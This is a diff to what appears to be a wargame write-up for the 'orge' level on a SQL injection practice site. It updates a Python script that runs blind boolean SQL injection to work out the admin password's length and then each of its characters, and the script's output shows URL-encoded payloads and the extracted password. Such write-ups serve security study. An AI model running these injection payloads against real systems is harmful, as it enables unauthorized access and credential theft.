@@ -183,7 +183,7 @@ import requests
 import urllib.parse
 import string
 
-cookies = {'PHPSESSID': 'jeae4igtrh2cq92r63ob4kqmqr'}
+cookies = {'PHPSESSID': 'jkvees84mr4jq3nallg9rum7he'}
 url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
 password_length = 0
 
@@ -200,8 +200,8 @@ for x in range(0, 10):
 
 print()    
 print(f"[!] Payload: ?pw={payload}")
+print(f"[!] Payload (URL encoded): ?pw={encoded_payload}")
 print(f"[!] Password length: {password_length}")
-print()
 
 password = ""
 searchspace = string.digits + string.ascii_letters
@@ -216,12 +216,14 @@ for index in range(1, password_length + 1):
 
     if "Hello admin" in response.text:
       password += char
+      print()
       print(f"[+] Payload: ?pw={payload}")
+      print(f"[+] Payload (URL encoded): ?pw={encoded_payload}")
       print(f"[+] Character at index {index}: {char}")
       break
 
 print()
-print(f"[!] Extracted Password: {password}")
+print(f"[!] Extracted password: {password}")
 print(f"[!] Final payload: ?pw={password}")
 ```
 
@@ -229,25 +231,41 @@ print(f"[!] Final payload: ?pw={password}")
 $ python .\orge_script.py
 
 [!] Payload: ?pw=' || id='admin' && length(pw)=8 -- -
+[!] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+length%28pw%29%3D8+--+-
 [!] Password length: 8
 
 [+] Payload: ?pw=' || id='admin' && substr(pw, 1, 1)='7' -- -
+[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+1%2C+1%29%3D%277%27+--+-
 [+] Character at index 1: 7
-[+] Payload: ?pw=' || id='admin' && substr(pw, 2, 1)='b' -- -
-[+] Character at index 2: b
-[+] Payload: ?pw=' || id='admin' && substr(pw, 3, 1)='7' -- -
-[+] Character at index 3: 7
-[+] Payload: ?pw=' || id='admin' && substr(pw, 4, 1)='5' -- -
-[+] Character at index 4: 5
-[+] Payload: ?pw=' || id='admin' && substr(pw, 5, 1)='1' -- -
-[+] Character at index 5: 1
-[+] Payload: ?pw=' || id='admin' && substr(pw, 6, 1)='a' -- -
-[+] Character at index 6: a
-[+] Payload: ?pw=' || id='admin' && substr(pw, 7, 1)='e' -- -
-[+] Character at index 7: e
-[+] Payload: ?pw=' || id='admin' && substr(pw, 8, 1)='c' -- -
-[+] Character at index 8: c     
 
-[!] Extracted Password: 7b751aec
-[!] Final payload: ?pw=7b751aec 
+[+] Payload: ?pw=' || id='admin' && substr(pw, 2, 1)='b' -- -
+[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+2%2C+1%29%3D%27b%27+--+-
+[+] Character at index 2: b
+
+[+] Payload: ?pw=' || id='admin' && substr(pw, 3, 1)='7' -- -
+[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+3%2C+1%29%3D%277%27+--+-
+[+] Character at index 3: 7
+
+[+] Payload: ?pw=' || id='admin' && substr(pw, 4, 1)='5' -- -
+[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+4%2C+1%29%3D%275%27+--+-
+[+] Character at index 4: 5
+
+[+] Payload: ?pw=' || id='admin' && substr(pw, 5, 1)='1' -- -
+[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+5%2C+1%29%3D%271%27+--+-
+[+] Character at index 5: 1
+
+[+] Payload: ?pw=' || id='admin' && substr(pw, 6, 1)='a' -- -
+[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+6%2C+1%29%3D%27a%27+--+-
+[+] Character at index 6: a
+
+[+] Payload: ?pw=' || id='admin' && substr(pw, 7, 1)='e' -- -
+[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+7%2C+1%29%3D%27e%27+--+-
+[+] Character at index 7: e
+
+[+] Payload: ?pw=' || id='admin' && substr(pw, 8, 1)='c' -- -
+[+] Payload (URL encoded): ?pw=%27+%7C%7C+id%3D%27admin%27+%26%26+substr%28pw%2C+8%2C+1%29%3D%27c%27+--+-
+[+] Character at index 8: c
+
+[!] Extracted password: 7b751aec
+[!] Final payload: ?pw=7b751aec
 ```
